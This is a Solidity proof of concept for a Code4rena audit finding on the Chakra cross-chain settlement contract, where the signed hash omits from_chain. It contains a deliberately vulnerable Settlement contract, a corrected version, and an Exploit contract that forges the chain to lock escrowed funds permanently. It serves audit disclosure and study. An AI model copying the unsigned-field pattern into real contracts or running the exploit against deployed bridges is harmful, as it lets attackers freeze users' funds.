// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Chakra settlement — Code4rena, August 2024.
    verifySignature hashes txid, from_handler, to_handler, and status, but not
    from_chain. The same validator signature accepts a forged chain. The handler
    rejects it and create_cross_txs[txid] is stored as Failed, so the escrow
    can no longer be released.
*/

contract Token {
    string public symbol = "CKR";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface ISignatureVerifier {
    function verify(bytes32 messageHash, bytes calldata signatures, uint8 signType) external view returns (bool);
}

contract VulnerableVerifier is ISignatureVerifier {
    // The validator digest is the hash Settlement already computed. Because that
    // hash omits from_chain, one commitment authorizes every chain string.
    function verify(bytes32 messageHash, bytes calldata signatures, uint8) external pure returns (bool) {
        return signatures.length == 32 && keccak256(signatures) == keccak256(abi.encodePacked(messageHash));
    }
}

contract SignatureVerifier is ISignatureVerifier {
    address public immutable signer;

    constructor(address _signer) {
        signer = _signer;
    }

    function verify(bytes32 messageHash, bytes calldata signatures, uint8) external view returns (bool) {
        (bytes32 r, bytes32 s, uint8 v) = abi.decode(signatures, (bytes32, bytes32, uint8));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
        return ecrecover(ethHash, v, r, s) == signer;
    }
}

contract Handler {
    function is_valid_handler(string memory from_chain, uint256 from_handler) public pure returns (bool) {
        return from_handler == 42 && keccak256(bytes(from_chain)) == keccak256(bytes("ethereum"));
    }

    function receive_cross_chain_callback(
        uint256,
        string memory from_chain,
        uint256 from_handler,
        uint8,
        uint8,
        bytes calldata
    ) external pure returns (bool) {
        if (is_valid_handler(from_chain, from_handler) == false) {
            return false;
        }
        return true;
    }
}

contract Settlement {
    enum CrossChainMsgStatus {
        Pending,
        Success,
        Failed
    }

    struct CrossTx {
        CrossChainMsgStatus status;
        address user;
        uint256 amount;
    }

    Token public token;
    Handler public handler;
    ISignatureVerifier public signatureVerifier;
    mapping(uint256 => CrossTx) public create_cross_txs;

    error AlreadySettled();

    constructor(Token _token, Handler _handler, ISignatureVerifier _verifier) {
        token = _token;
        handler = _handler;
        signatureVerifier = _verifier;
    }

    function escrow(uint256 txid, address user, uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "escrow");
        create_cross_txs[txid] = CrossTx(CrossChainMsgStatus.Pending, user, amount);
    }

    function receive_cross_chain_callback(
        uint256 txid,
        string memory from_chain,
        uint256 from_handler,
        address to_handler,
        CrossChainMsgStatus status,
        uint8 sign_type,
        bytes calldata signatures
    ) external {
        verifySignature(txid, from_handler, to_handler, status, sign_type, signatures);
        processCrossChainCallback(txid, from_chain, from_handler, to_handler, status, sign_type, signatures);
    }

    function verifySignature(
        uint256 txid,
        uint256 from_handler,
        address to_handler,
        CrossChainMsgStatus status,
        uint8 sign_type,
        bytes calldata signatures
    ) internal view {
        bytes32 message_hash = keccak256(abi.encodePacked(txid, from_handler, to_handler, status));
        require(signatureVerifier.verify(message_hash, signatures, sign_type), "Invalid signature");
    }

    function processCrossChainCallback(
        uint256 txid,
        string memory from_chain,
        uint256 from_handler,
        address to_handler,
        CrossChainMsgStatus status,
        uint8 sign_type,
        bytes calldata signatures
    ) internal {
        if (create_cross_txs[txid].status != CrossChainMsgStatus.Pending) revert AlreadySettled();
        if (
            Handler(to_handler).receive_cross_chain_callback(
                txid, from_chain, from_handler, uint8(status), sign_type, signatures
            )
        ) {
            create_cross_txs[txid].status = status;
            uint256 amount = create_cross_txs[txid].amount;
            address user = create_cross_txs[txid].user;
            create_cross_txs[txid].amount = 0;
            require(token.transfer(user, amount), "release");
        } else {
            // @> VULN: from_chain was not signed, so a forged chain stores Failed and the escrow cannot be retried
            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;
        }
    }
}

contract SettlementFixed {
    enum CrossChainMsgStatus {
        Pending,
        Success,
        Failed
    }

    struct CrossTx {
        CrossChainMsgStatus status;
        address user;
        uint256 amount;
    }

    Token public token;
    Handler public handler;
    SignatureVerifier public signatureVerifier;
    mapping(uint256 => CrossTx) public create_cross_txs;

    constructor(Token _token, Handler _handler, SignatureVerifier _verifier) {
        token = _token;
        handler = _handler;
        signatureVerifier = _verifier;
    }

    function escrow(uint256 txid, address user, uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "escrow");
        create_cross_txs[txid] = CrossTx(CrossChainMsgStatus.Pending, user, amount);
    }

    function receive_cross_chain_callback(
        uint256 txid,
        string memory from_chain,
        uint256 from_handler,
        address to_handler,
        Settlement.CrossChainMsgStatus status,
        uint8 sign_type,
        bytes calldata signatures
    ) external {
        bytes32 message_hash = keccak256(abi.encodePacked(txid, from_chain, from_handler, to_handler, status));
        require(signatureVerifier.verify(message_hash, signatures, sign_type), "Invalid signature");
        require(create_cross_txs[txid].status == CrossChainMsgStatus.Pending, "pending");
        require(
            handler.receive_cross_chain_callback(txid, from_chain, from_handler, uint8(status), sign_type, signatures),
            "handler"
        );
        create_cross_txs[txid].status = CrossChainMsgStatus.Success;
        uint256 amount = create_cross_txs[txid].amount;
        address user = create_cross_txs[txid].user;
        create_cross_txs[txid].amount = 0;
        require(token.transfer(user, amount), "release");
    }
}

contract Exploit {
    uint256 public constant TXID = 7;
    uint256 public constant FROM_HANDLER = 42;
    uint256 public constant ESCROW = 10 ether;
    address public constant USER = 0x3333333333333333333333333333333333333333;

    Token public token;
    Handler public handler;
    VulnerableVerifier public verifier;
    Settlement public settlement;
    uint8 public statusAfter;
    bool public retryReverted;
    uint256 public locked;
    uint256 public userBal;

    constructor() {
        token = new Token();
        handler = new Handler();
        verifier = new VulnerableVerifier();
        settlement = new Settlement(token, handler, verifier);
    }

    function run() external {
        token.mint(address(this), ESCROW);
        token.approve(address(settlement), ESCROW);
        settlement.escrow(TXID, USER, ESCROW);
        bytes32 messageHash = keccak256(
            abi.encodePacked(TXID, FROM_HANDLER, address(handler), Settlement.CrossChainMsgStatus.Success)
        );
        bytes memory signatures = abi.encodePacked(messageHash);
        settlement.receive_cross_chain_callback(
            TXID, "evil", FROM_HANDLER, address(handler), Settlement.CrossChainMsgStatus.Success, 1, signatures
        );
        (Settlement.CrossChainMsgStatus status,,) = settlement.create_cross_txs(TXID);
        statusAfter = uint8(status);
        try settlement.receive_cross_chain_callback(
            TXID, "ethereum", FROM_HANDLER, address(handler), Settlement.CrossChainMsgStatus.Success, 1, signatures
        ) {
            retryReverted = false;
        } catch {
            retryReverted = true;
        }
        locked = token.balanceOf(address(settlement));
        userBal = token.balanceOf(USER);
        require(statusAfter == uint8(Settlement.CrossChainMsgStatus.Failed), "status");
        require(retryReverted, "retried");
        require(locked == ESCROW, "locked");
        require(userBal == 0, "user");
    }
}
